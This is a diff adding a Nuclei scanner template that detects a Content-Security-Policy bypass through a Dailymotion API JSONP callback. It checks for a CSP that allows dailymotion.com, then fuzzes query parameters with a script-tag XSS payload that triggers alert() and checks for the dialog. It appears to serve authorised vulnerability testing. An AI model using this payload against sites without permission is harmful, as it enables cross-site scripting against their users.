@@ -1,0 +1,55 @@
+id: dailymotion-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Dailymotion API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,dailymotion-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "dailymotion.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: dailymotion_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "dailymotion_api_csp_xss == true"
+# digest: 4b0a00483046022100e2d38ffb87d9476d5c251094fcd9653162e92f3cb5993c5d248d798fe7f60a90022100d6c5c6603c2b0cc30133a33fc7b750bf79fc418a5293f5087d4a5502c9a73a6c:922c64590222798bb761d5b6d8e72950
